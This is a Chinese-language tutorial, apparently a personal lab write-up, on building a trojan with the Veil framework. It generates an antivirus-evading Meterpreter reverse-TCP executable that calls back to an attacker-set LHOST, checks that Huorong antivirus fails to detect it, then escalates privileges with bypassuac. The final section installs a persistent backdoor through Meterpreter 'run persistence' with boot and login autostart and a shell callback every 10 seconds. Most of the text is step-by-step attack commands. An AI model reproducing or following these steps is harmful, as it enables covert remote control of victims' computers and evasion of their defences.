03


制作木马

  1.下载好veil工具后，在目录打开

   sudo ./Veil.py （打开工具）


        2.选择第一个模块

     use 1


        3.打开payload列表

    list      有41个可用模块


        4.我们选择cs/meterpreter/rev_tcp模块，是第十一个      use 11


        5.设置一下回弹ip   LHOST  (填本机ip) 

 set LHOST 192.168.232.132 我的kali内网ip是这个

    下次利用内网穿透去设置不限于内网的木马；


        6.然后设置好了可以 options 查看一下选项 （和msf差不多命令）

        然后generate 运行，设置一个名字，这里我随便输入qwe

然后选择制作模式，1的免杀效果稍微好点。

        生成了一个exe文件。


        7.在指定目录下找到这个文件，并放到我物理机上，因为我的物理机装了火绒，我就用火绒测试一下

        用火绒指定检测一下，  （火绒打钱）滑稽

        好的，火绒静态下没有检测出来。

        我们对比一下，用没有免杀的木马试试

        直接挂掉


        接下我再用virustotal后门检测工具检测一下，看看能被检测出多少后门程序 。

05


 1.接下来就是提升成持续后门了。因为正常的话对方主机已关机我们的shell就不可用了，所以我们要设置成持续后们。

            还是先bypassuac提权


 完美提权


        2.使用 run persistence 打开这个模块

       -h 是帮助命令，查看有什么功能，大家自行去翻译


        3.接下来用以下命令进行配置。

        -A     是自动选择默认监听模块

        -X     是系统启动时自动启动代理

        -U     是用户登录时自动启动代理

        -i       是多少秒回弹一次shell

        -p      是本机监听回弹的端口号

        -r      是本机监听回弹的ip

            


        4.然后我们退出shell 用sessions -k 4 删除sessioons

        10秒就会回弹一次，就不怕对方关机，而shell下回不可用了。
